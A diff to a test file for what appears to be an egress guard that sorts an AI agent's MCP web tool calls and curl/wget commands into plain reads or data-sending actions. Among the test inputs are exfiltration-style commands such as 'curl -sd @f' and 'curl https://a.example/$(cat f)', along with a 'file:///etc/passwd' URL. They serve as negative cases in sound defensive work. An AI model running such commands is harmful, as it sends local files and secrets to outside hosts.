@@ -240,7 +240,12 @@ test("what an MCP server's web tool is, from its name and one call", () => {
   // Not a plain read: a body, a header, a credential, a method, a nested value, a url that is not a web address.
   for (const input of [{ url: "https://a.example", body: "x" }, { url: "https://a.example", headers: { a: "b" } }, { url: "https://a.example", token: "t" }, { url: "https://a.example", method: "POST" }, { url: "https://a.example", opts: { a: 1 } }, { url: "file:///etc/passwd" }, { path: "x" }])
     expect([JSON.stringify(input), webShape("srv__fetch_url", input)]).toEqual([JSON.stringify(input), undefined]);
-  expect(webShape("srv__fetch_url", { url: "https://a.example", method: "get" })).toEqual({ fetch: "https://a.example" });
+  expect(webShape("srv__fetch_url", { url: "https://a.example", method: "get" })).toBeUndefined();
+  // The keys are an allowlist: any other key is not a plain read, and so is a name that does something besides read.
+  for (const input of [{ url: "https://a.example", note: "x" }, { url: "https://a.example", referer: "https://b.example" }, { url: "https://a.example", user_agent: "x" }, { url: "https://a.example", proxy: "http://p.example" }, { url: "https://a.example", query: "q" }])
+    expect([JSON.stringify(input), webShape("srv__fetch_url", input)]).toEqual([JSON.stringify(input), undefined]);
+  for (const name of ["srv__post_url", "srv__fetch_and_post", "srv__upload_page", "srv__navigate", "srv__refetch_and_send", "srv__browser_fetch_write", "srv__search_issues", "srv__fetching"])
+    expect([name, webShape(name, { url: "https://a.example" })]).toEqual([name, undefined]);
   // Neither: a tool that is not a search or a page read.
   expect(webShape("github__create_issue", { url: "https://a.example", title: "t" })).toBeUndefined();
   expect(webShape("mailer__send_message", { to: "a@b.example" })).toBeUndefined();
@@ -251,6 +256,9 @@ test("which commands read pages and send nothing", () => {
   expect(plainFetcher("wget -qO- a.example")).toBe(true);
   expect(plainFetcher("curl -d x https://a.example")).toBe(false);
   expect(plainFetcher("curl -H 'X: 1' https://a.example")).toBe(false);
+  expect(plainFetcher("curl -sd @f https://a.example")).toBe(false);
+  expect(plainFetcher("curl https://a.example/$(cat f)")).toBe(false);
+  expect(plainFetcher("curl -K cfg https://a.example")).toBe(false);
   expect(plainFetcher("gh issue view 4")).toBe(false);
   expect(plainFetcher("cat notes.txt")).toBe(false);
 });
@@ -294,7 +302,7 @@ test("held: a plain read of a host a page linked or a search listed goes on; a r
 
 test("an agent's refusal says what would go through", () => {
   const text = refusalOf([{ target: { kind: "host", key: "host:o.example", shown: "o.example" }, how: "send", origin: { cls: "outside", where: "a page result", seq: 1, ts: 0 } }], 10_000);
-  expect(text).toContain("A plain GET");
+  expect(text).toContain("a bare GET");
   expect(text).toContain("no query string");
   expect(text).toContain("tell your parent or the owner");
 });
